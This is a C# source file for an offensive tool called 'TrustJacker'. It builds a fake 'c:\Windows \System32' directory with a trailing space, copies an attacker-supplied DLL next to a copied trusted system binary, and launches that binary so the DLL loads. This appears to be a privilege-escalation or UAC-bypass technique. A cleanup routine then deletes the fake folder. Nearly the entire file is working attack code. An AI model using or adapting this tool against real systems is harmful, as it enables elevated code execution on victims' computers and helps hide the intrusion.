using System;
using System.Diagnostics;
using NDesk.Options;

namespace TrustJacker
{
    class Program
    {
        static String fakewindowsdir = "\"" + "c:\\Windows \\" + "\"";
        static String legitdir = @"c:\Windows\System32\";

        public static void ShowHelp(OptionSet p)
        {
            Console.WriteLine("Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }

        static void PopPopPop(String dllPath, String binary)
        {
            String[] dllName = dllPath.Split('\\');
            Console.WriteLine("creating dir & copying the files...");
            Process.Start("cmd.exe", @" /c mkdir " + fakewindowsdir + " && mkdir " + "\"" + @"c:\Windows \System32\" + "\"" + " && copy " + dllPath + " \"" + @"c:\Windows \System32\" + dllName[dllName.Length - 1] + "\"" +
                " && copy " + legitdir + binary + " \"" + @"c:\Windows \System32\" + binary + "\"");

            Console.WriteLine("popping the shell...");
            Process.Start("cmd.exe","/c" + "\"" + @"c:\Windows \System32\" + binary + "\""); 
        }

        static void CleanUp()
        {
            Console.WriteLine("cleaning up...");
            Process.Start("cmd.exe", @"/c rmdir " + fakewindowsdir + "/s /q");
            Console.WriteLine("done!");
        }
        static void Main(string[] args)
        {
            var dllPath = String.Empty;
            var binary = String.Empty;
            var cleanup = false;
            var help = false;

            var options = new OptionSet()
            {
                {"dllpath=","Path to the dll on the computer", o => dllPath = o },
                {"binary=","The binary name to pop the shell", o=> binary = o },
                {"c|clean|cleanup","Cleanup the fake folder and its contents", o => cleanup = true },
                {"h|?|help","show this help menu.", o => help = true }
            };

            Info.PrintHeader();

            try
            {
                options.Parse(args);

                if (help)
                {
                    ShowHelp(options);
                    return;
                }

                if (!cleanup && (string.IsNullOrEmpty(dllPath) || string.IsNullOrEmpty(binary)))
                {
                    ShowHelp(options);
                    return;
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
                ShowHelp(options);
                return;
            }
            if(cleanup)
                CleanUp();
            else
                PopPopPop(@dllPath, binary);
          
        }
    }
}
